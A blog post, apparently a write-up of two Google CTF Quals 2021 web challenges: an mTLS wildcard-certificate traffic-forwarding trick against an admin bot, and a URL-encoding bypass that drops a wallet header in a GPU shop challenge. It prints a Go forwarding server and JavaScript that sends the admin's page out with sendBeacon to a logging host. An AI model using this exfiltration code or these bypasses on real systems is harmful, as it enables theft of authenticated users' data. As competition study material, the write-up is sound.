<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link rel=manifest href=/manifest.json><meta name=description content="I played Google CTF Quals 2021 and here is my writeup.
"><title>Two Webs' Writeup in Google CTF Quals 2021</title><link rel=canonical href=https://blog.zeddyu.info/2021/07/21/google-qual-2021/><link rel=stylesheet href=/scss/style.min.css><meta property="og:title" content="Two Webs' Writeup in Google CTF Quals 2021"><meta property="og:description" content="I played Google CTF Quals 2021 and here is my writeup.
"><meta property="og:url" content="https://blog.zeddyu.info/2021/07/21/google-qual-2021/"><meta property="og:site_name" content="Zeddy's Blog"><meta property="og:type" content="article"><meta property="article:section" content="Posts"><meta property="article:tag" content="CTF"><meta property="article:published_time" content="2021-07-21T02:58:54+00:00"><meta property="article:modified_time" content="2021-07-21T02:58:54+00:00"><meta name=twitter:site content="@ZeddYu_Lu"><meta name=twitter:creator content="@ZeddYu_Lu"><meta name=twitter:title content="Two Webs' Writeup in Google CTF Quals 2021"><meta name=twitter:description content="I played Google CTF Quals 2021 and here is my writeup.
"><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDESKL57LT"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDESKL57LT",{anonymize_ip:!1})}</script></head><body class="article-page has-toc"><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex
extended"><div id=article-toolbar><a href=https://blog.zeddyu.info class=back-home><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="15 6 9 12 15 18"/></svg><span>Back</span></a></div><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/CTF/ style=background-color:#ce0000;color:#fff>CTF</a></header><h2 class=article-title><a href=/2021/07/21/google-qual-2021/>Two Webs' Writeup in Google CTF Quals 2021</a></h2><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg><time class=article-time--published>Jul 21, 2021</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><time class=article-time--reading>8 minute read</time></div></footer></div></header><section class=article-content><p>I played Google CTF Quals 2021 and here is my writeup.</p><p>I played with the Tea Deliverers team in the Google CTF Quals 2021. We sovled 2 webs in Google CTF 2021 quals but I think I have only made a small contribution. In the end, we got 11th rank, sadly I couldn&rsquo;t do much. Hope I could do more in the next time!</p><p><figure class=gallery-image style=flex-grow:182;flex-basis:438px><a href=/2021/07/21/google-qual-2021/1.png data-size=2876x1574><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2021/07/21/google-qual-2021/1.png width=2876 height=1574 srcset="/2021/07/21/google-qual-2021/1_huca209092d9f0c4aada7ac465e59273de_199165_480x0_resize_box_3.png 480w, /2021/07/21/google-qual-2021/1_huca209092d9f0c4aada7ac465e59273de_199165_1024x0_resize_box_3.png 1024w" loading=lazy></a></figure></p><p>OK. Let&rsquo;s talk about the CTF.</p><h2 id=empty-ls>Empty LS</h2><p>There is a web challenge called empty ls. This challenge examines a security risk in the MTLS scenario. We could get the following information from the challenge:</p><ol><li><p>There is a website <a class=link href=https://www.zone443.dev/ target=_blank rel=noopener>https://www.zone443.dev/</a>. Two primary services are offered on this website.</p></li><li><ol><li>This website provides a user registration service and offers user&rsquo;s certificates for download. You could register a user and get a client certificate for your identity.</li><li>Another service is that it also provides a subdomain registration service. You could register a subdomain under zone443.dev and set an A record to an IP. So it means you could get a sub-domain that is entirely under your control.</li></ol></li><li><p>The challenge provides an <a class=link href=https://www.zone443.dev/example.go target=_blank rel=noopener>example code</a> and a <a class=link href=https://www.zone443.dev/clientca.crt.pem target=_blank rel=noopener>client CA cert</a> which could be used to verify users. Besides, you could report an URL, and the admin will check it.</p></li><li><p>There is another website <a class=link href=https://admin.zone443.dev target=_blank rel=noopener>https://admin.zone443.dev</a>. If you visit the admin&rsquo;s website with your certificate, it will return &lsquo;Hello, user. You are not the admin.&rsquo; The &lsquo;user&rsquo; is exactly your username when you registered on <a class=link href=www.zone443.dev>www.zone443.dev</a>.</p></li></ol><p>So, obviously, we need to access this site as admin or steal the response when the admin visits the admin.zone443.dev in some way.</p><p>At first, I came up with an idea. Maybe we could steal the admin&rsquo;s client certificate when the admin visits our website. After we get the admin&rsquo;s certificate, we could try to use it to forge as admin and visit the admin.zone443.dev. But the idea is too naive. After I learn about some docs about MTLS, this may be impossible. So I get stuck.</p><p>Although the above idea doesn&rsquo;t work, I think we are still on the right way. At least, our target in this challenge is much more evident than the target in letschat. (In the challenge letschat, we even don&rsquo;t know what the target is, where the flag is and what we should access).</p><p>After a few hours, we found an interesting point. The certificate of the admin.zone443.dev is the wildcard. It is *.zone443.dev. But what does it mean? Then I tried to google &lsquo;HTTPS wildcard certificate&rsquo; and &lsquo;TLS client auth bypass&rsquo;. The bad news is I couldn&rsquo;t get anything helpful to solve the challenge.</p><p>We are stuck again until we came up with another idea. In the period, we also found that admin.zone443.dev doesn&rsquo;t check the host. So this means there will be no warnings if you visit a subdomain whose A record is 34.140.9.160(the A record of admin.zone443.dev). That&rsquo;s an interesting phenomenon.</p><p>OK. Let&rsquo;s talk about XSS. If we want to read the content of the admin&rsquo;s page, we need XSS. But if we&rsquo;re going to XSS on our subdomain to read the content of the admin&rsquo;s page, we need to break the same-origin policy. Is it really a way using a feature of HTTPS we don&rsquo;t know to bypass the same-origin policy?</p><p>Based on the question, we thought, how about DNS Rebinding? But there are quite a few limitations. The max execution time of the bot&rsquo;s chrome is about 10s, but the time of chrome&rsquo;s DNS cache is 60s. You can&rsquo;t set two A records when you register your subdomain, either.</p><p>It seems we are stuck again. All right.</p><p>Let&rsquo;s review the whole challenge. Do you still remember we could take all control of a subdomain? Yeah. It means we could do what we want to do on it. So what about traffic forwarding? If we forward the traffic to admin.zone443.dev when the admin visits our website, what do you think will happen next? The response is from admin.zone443.dev, but the domain is our domain!</p><p>Why? As we said above, the certificate of admin.zone443.dev is wildcard, and it ignores the host header in HTTP, so there will be no warnings and no errors in this period. What&rsquo;s more, for admin, he actually visits admin.zone443.dev with his certificate, and for browser, it thinks the domain admin visits is our domain. So, in this scenario, if we send an AJAX request to request the admin&rsquo;s response on our domain, the browser will think this request doesn&rsquo;t violate the same-origin policy. Because the domain which admin visit is our domain, the domain which AJAX requests is also our domain.</p><p>It makes sense! Quite like a variant DNS Rebinding. The process of the exploit is as follows.</p><ol><li>Register a subdomain through the subdomain registration service, which is provided by the challenge.</li><li>Report your subdomain to admin.</li><li>The admin&rsquo;s browser makes the first request. At this time, the admin will visit your site and execute javascript on your page. The JS code will make an AJAX request to your subdomain.</li><li>The second request is made by AJAX. You should forward the traffic to admin.zone443.dev at this time.</li><li>In the end, after you get the response from AJAX, send the response to your HTTP log in some way, and you could get the flag.</li></ol><p>That&rsquo;s all the process to solve the challenge. We write a go server to forward the traffic. Thanks to my great teammate.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=kn>package</span> <span class=nx>main</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;crypto/tls&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;crypto/x509&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;encoding/pem&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;fmt&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;io&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;io/ioutil&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;log&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;net&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=s>&#34;github.com/valyala/fasthttp&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;golang.org/x/sync/errgroup&#34;</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// clientCAPool consructs a CertPool containing the client CA.
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>func</span> <span class=nf>clientCAPool</span><span class=p>()(</span> <span class=o>*</span> <span class=nx>x509</span><span class=p>.</span><span class=nx>CertPool</span><span class=p>,</span> <span class=kt>error</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>caCertPem</span><span class=p>,</span> <span class=nx>err</span><span class=p>:</span> <span class=p>=</span> <span class=nx>ioutil</span><span class=p>.</span><span class=nf>ReadFile</span><span class=p>(</span><span class=s>&#34;clientca.crt.pem&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>nil</span><span class=p>,</span> <span class=nx>fmt</span><span class=p>.</span><span class=nf>Errorf</span><span class=p>(</span><span class=s>&#34;error reading clientca cert: %v&#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nx>caCertBlock</span><span class=p>,</span> <span class=nx>rest</span><span class=p>:</span> <span class=p>=</span> <span class=nx>pem</span><span class=p>.</span><span class=nf>Decode</span><span class=p>(</span><span class=nx>caCertPem</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nx>caCertBlock</span> <span class=o>==</span> <span class=kc>nil</span> <span class=o>||</span> <span class=nb>len</span><span class=p>(</span><span class=nx>rest</span><span class=p>)</span> <span class=p>&gt;</span> <span class=mi>0</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>nil</span><span class=p>,</span> <span class=nx>fmt</span><span class=p>.</span><span class=nf>Errorf</span><span class=p>(</span><span class=s>&#34;error decoding clientca cert PEM block. caCertBlock: %v, len(rest): %d&#34;</span><span class=p>,</span> <span class=nx>caCertBlock</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=nx>rest</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nx>caCertBlock</span><span class=p>.</span><span class=nx>Type</span> <span class=o>!=</span> <span class=s>&#34;CERTIFICATE&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>nil</span><span class=p>,</span> <span class=nx>fmt</span><span class=p>.</span><span class=nf>Errorf</span><span class=p>(</span><span class=s>&#34;clientca cert had a bad type: %s&#34;</span><span class=p>,</span> <span class=nx>caCertBlock</span><span class=p>.</span><span class=nx>Type</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nx>caCert</span><span class=p>,</span> <span class=nx>err</span><span class=p>:</span> <span class=p>=</span> <span class=nx>x509</span><span class=p>.</span><span class=nf>ParseCertificate</span><span class=p>(</span><span class=nx>caCertBlock</span><span class=p>.</span><span class=nx>Bytes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>nil</span><span class=p>,</span> <span class=nx>fmt</span><span class=p>.</span><span class=nf>Errorf</span><span class=p>(</span><span class=s>&#34;error parsing clientca cert ASN.1 DER: %v&#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>cas</span><span class=p>:</span> <span class=p>=</span> <span class=nx>x509</span><span class=p>.</span><span class=nf>NewCertPool</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=nx>cas</span><span class=p>.</span><span class=nf>AddCert</span><span class=p>(</span><span class=nx>caCert</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>cas</span><span class=p>,</span> <span class=kc>nil</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>servePage</span><span class=p>(</span><span class=nx>conn</span> <span class=nx>net</span><span class=p>.</span><span class=nx>Conn</span><span class=p>)</span> <span class=kt>error</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>log</span><span class=p>.</span><span class=nf>Printf</span><span class=p>(</span><span class=s>&#34;serve page&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nx>clientCA</span><span class=p>,</span> <span class=nx>err</span><span class=p>:</span> <span class=p>=</span> <span class=nf>clientCAPool</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>err</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>serverCert</span><span class=p>,</span> <span class=nx>err</span><span class=p>:</span> <span class=p>=</span> <span class=nx>tls</span><span class=p>.</span><span class=nf>LoadX509KeyPair</span><span class=p>(</span><span class=s>&#34;fullchain.pem&#34;</span><span class=p>,</span> <span class=s>&#34;privkey.pem&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>err</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>tlsConn</span><span class=p>:</span> <span class=p>=</span> <span class=nx>tls</span><span class=p>.</span><span class=nf>Server</span><span class=p>(</span><span class=nx>conn</span><span class=p>,</span> <span class=o>&amp;</span> <span class=nx>tls</span><span class=p>.</span><span class=nx>Config</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>Certificates</span><span class=p>:</span> <span class=p>[]</span> <span class=nx>tls</span><span class=p>.</span><span class=nx>Certificate</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>serverCert</span>
</span></span><span class=line><span class=cl>        <span class=p>},</span>
</span></span><span class=line><span class=cl>        <span class=nx>ClientAuth</span><span class=p>:</span> <span class=nx>tls</span><span class=p>.</span><span class=nx>VerifyClientCertIfGiven</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nx>ClientCAs</span><span class=p>:</span> <span class=nx>clientCA</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>})</span>
</span></span><span class=line><span class=cl>    <span class=nx>err</span> <span class=p>=</span> <span class=nx>tlsConn</span><span class=p>.</span><span class=nf>Handshake</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>err</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nx>srv</span><span class=p>:</span> <span class=p>=</span> <span class=nx>fasthttp</span><span class=p>.</span><span class=nx>Server</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>DisableKeepalive</span><span class=p>:</span> <span class=kc>true</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=nx>Handler</span><span class=p>:</span> <span class=nx>fasthttp</span><span class=p>.</span><span class=nf>FSHandler</span><span class=p>(</span><span class=s>&#34;static&#34;</span><span class=p>,</span> <span class=mi>0</span><span class=p>),</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>srv</span><span class=p>.</span><span class=nf>ServeConn</span><span class=p>(</span><span class=nx>tlsConn</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>serveProxy</span><span class=p>(</span><span class=nx>conn</span> <span class=nx>net</span><span class=p>.</span><span class=nx>Conn</span><span class=p>)</span> <span class=kt>error</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>next</span><span class=p>,</span> <span class=nx>err</span><span class=p>:</span> <span class=p>=</span> <span class=nx>net</span><span class=p>.</span><span class=nf>Dial</span><span class=p>(</span><span class=s>&#34;tcp&#34;</span><span class=p>,</span> <span class=s>&#34;admin.zone443.dev:443&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>err</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=kd>var</span> <span class=nx>group</span> <span class=nx>errgroup</span><span class=p>.</span><span class=nx>Group</span>
</span></span><span class=line><span class=cl>    <span class=nx>group</span><span class=p>.</span><span class=nf>Go</span><span class=p>(</span><span class=kd>func</span><span class=p>()</span> <span class=kt>error</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>_</span><span class=p>,</span> <span class=nx>err</span><span class=p>:</span> <span class=p>=</span> <span class=nx>io</span><span class=p>.</span><span class=nf>Copy</span><span class=p>(</span><span class=nx>conn</span><span class=p>,</span> <span class=nx>next</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>err</span>
</span></span><span class=line><span class=cl>    <span class=p>})</span>
</span></span><span class=line><span class=cl>    <span class=nx>group</span><span class=p>.</span><span class=nf>Go</span><span class=p>(</span><span class=kd>func</span><span class=p>()</span> <span class=kt>error</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>_</span><span class=p>,</span> <span class=nx>err</span><span class=p>:</span> <span class=p>=</span> <span class=nx>io</span><span class=p>.</span><span class=nf>Copy</span><span class=p>(</span><span class=nx>next</span><span class=p>,</span> <span class=nx>conn</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nx>err</span>
</span></span><span class=line><span class=cl>    <span class=p>})</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>group</span><span class=p>.</span><span class=nf>Wait</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>lis</span><span class=p>,</span> <span class=nx>err</span><span class=p>:</span> <span class=p>=</span> <span class=nx>net</span><span class=p>.</span><span class=nf>Listen</span><span class=p>(</span><span class=s>&#34;tcp&#34;</span><span class=p>,</span> <span class=s>&#34;:https&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>log</span><span class=p>.</span><span class=nf>Fatalf</span><span class=p>(</span><span class=s>&#34;Failed to listen: %v&#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>count</span><span class=p>:</span> <span class=p>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>conn</span><span class=p>,</span> <span class=nx>err</span><span class=p>:</span> <span class=p>=</span> <span class=nx>lis</span><span class=p>.</span><span class=nf>Accept</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>.</span><span class=nf>Fatalf</span><span class=p>(</span><span class=s>&#34;Failed to accept: %v&#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nx>count</span><span class=o>++</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>count</span> <span class=o>==</span> <span class=mi>1</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>go</span> <span class=kd>func</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>err</span><span class=p>:</span> <span class=p>=</span> <span class=nf>servePage</span><span class=p>(</span><span class=nx>conn</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=nx>log</span><span class=p>.</span><span class=nf>Printf</span><span class=p>(</span><span class=s>&#34;Failed to serve page: %v&#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}()</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>go</span> <span class=kd>func</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>err</span><span class=p>:</span> <span class=p>=</span> <span class=nf>serveProxy</span><span class=p>(</span><span class=nx>conn</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=nx>log</span><span class=p>.</span><span class=nf>Printf</span><span class=p>(</span><span class=s>&#34;Failed to serve proxy: %v&#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}()</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The javascript code is something like this.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>var</span> <span class=nx>xhttp</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>XMLHttpRequest</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nx>xhttp</span><span class=p>.</span><span class=nx>onreadystatechange</span> <span class=o>=</span> <span class=kd>function</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nx>navigator</span><span class=p>.</span><span class=nx>sendBeacon</span><span class=p>(</span><span class=s1>&#39;https://http_log&#39;</span><span class=p>,</span> <span class=k>this</span><span class=p>.</span><span class=nx>responseText</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=nx>xhttp</span><span class=p>.</span><span class=nx>open</span><span class=p>(</span><span class=s2>&#34;GET&#34;</span><span class=p>,</span> <span class=s2>&#34;/&#34;</span><span class=p>,</span> <span class=kc>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>xhttp</span><span class=p>.</span><span class=nx>withCredentials</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>xhttp</span><span class=p>.</span><span class=nx>send</span><span class=p>();</span>
</span></span></code></pre></div><p>At last, we got the flag. Pretty cool, man!</p><p><figure class=gallery-image style=flex-grow:373;flex-basis:896px><a href=/2021/07/21/google-qual-2021/2.png data-size=2830x758><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2021/07/21/google-qual-2021/2.png width=2830 height=758 srcset="/2021/07/21/google-qual-2021/2_hubdd97af41215d338ab233bf62d434eef_79078_480x0_resize_box_3.png 480w, /2021/07/21/google-qual-2021/2_hubdd97af41215d338ab233bf62d434eef_79078_1024x0_resize_box_3.png 1024w" loading=lazy></a></figure></p><h2 id=gpu-shop>GPU Shop</h2><p>This challenge has an environment that is so complex that I don&rsquo;t know how to explain it. I want to try my best to describe the setting of the challenge in short.</p><p>The challenge provides two services.</p><ol><li>The first service is a reverse proxy service <a class=link href=https://paymeflare-web.2021.ctfcompetition.com target=_blank rel=noopener>https://paymeflare-web.2021.ctfcompetition.com</a>. After you log in to this site with your Google account, you could set some settings according to the <a class=link href=https://paymeflare-web.2021.ctfcompetition.com/doc target=_blank rel=noopener>document</a>.<ul><li>The reverse proxy will set an HTTP header x-pay and visit your IP.</li><li>If you want to visit the URL which has &lsquo;checkout&rsquo;, the proxy will add an HTTP header &lsquo;X-Wallet&rsquo;.</li></ul></li><li>There is another service <a class=link href=http://gpushop.2021.ctfcompetition.com target=_blank rel=noopener>http://gpushop.2021.ctfcompetition.com</a>. This website uses the paymeflare service as the reverse proxy. You could buy the flag on this website.</li></ol><ul><li><ul><li>When you try to buy the flag, it will get the eth address from the HTTP header &lsquo;X-Wallet&rsquo;.</li><li>Request the balance of the eth address through cloudflare-eth.com.</li><li>If your balance is greater than your cost, you will get the flag.</li></ul></li></ul><p><del>We don&rsquo;t know how to solve the challenge, so we ask our boss to get a pretty rich eth address and buy the flag in the end.</del></p><p>Although there are many proxies in the challenge, we could use URLEncode to bypass the &lsquo;checkout&rsquo; limitation, and the backend will not get the &lsquo;X-Wallet&rsquo; header. The GPU shop will get a pretty rich eth address because of the code used in gpushop.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>format_addr</span><span class=p>(</span><span class=nv>$addr</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=s1>&#39;0x&#39;</span><span class=o>.</span><span class=nx>str_pad</span><span class=p>(</span><span class=nv>$addr</span><span class=p>,</span> <span class=mi>40</span><span class=p>,</span> <span class=s1>&#39;0&#39;</span><span class=p>,</span> <span class=nx>STR_PAD_LEFT</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$order</span><span class=o>-&gt;</span><span class=na>wallet</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>format_addr</span><span class=p>(</span><span class=nv>$request</span><span class=o>-&gt;</span><span class=na>header</span><span class=p>(</span><span class=s1>&#39;X-Wallet&#39;</span><span class=p>));</span>
</span></span></code></pre></div><p>When the header &lsquo;X-Wallet&rsquo; is not set, the value of <code>$order->wallet</code> is <code>0x0000000000000000000000000000000000000000</code> and the balance of this address is <code>0x1c923afe206b9068f3f</code> which is greater than the cost of flag <code>1537550000000000000000</code>. So we could buy the flag.</p><p><figure><a href=https://i.niupic.com/images/2021/07/21/9otK.png><img src=https://i.niupic.com/images/2021/07/21/9otK.png loading=lazy></a></figure></p><h2 id=other-webs>Other Webs</h2><p>There are other two webs. One of them is callled letschat. In this challenge, you need to do a lot of brainstorming, and we take pretty much time to solve this challenge but still fail in the end. Although the intended solution is to predict the UUID of the message, I realized that some teams bruted the UUID to get the flag. Mmm, this really makes me mad. It&rsquo;s too guessy and pretty annoying. I initially thought this challenge was inspired by some slack&rsquo;s vulnerabilities from the real world, but the intended solution beat me.</p><p>The last web is an XSS challenge created by @terjanq. Pretty cool and amazing. You could read this <a class=link href=https://gist.github.com/terjanq/458d8ec1148e96f7ccbdccfd908c56f6 target=_blank rel=noopener>simple solution</a> written by him.</p><p>Thanks for reading. Hope my bad English has not affected your reading of this article. :></p></section><footer class=article-footer><section class=article-tags><a href=/tags/CTF/>CTF</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 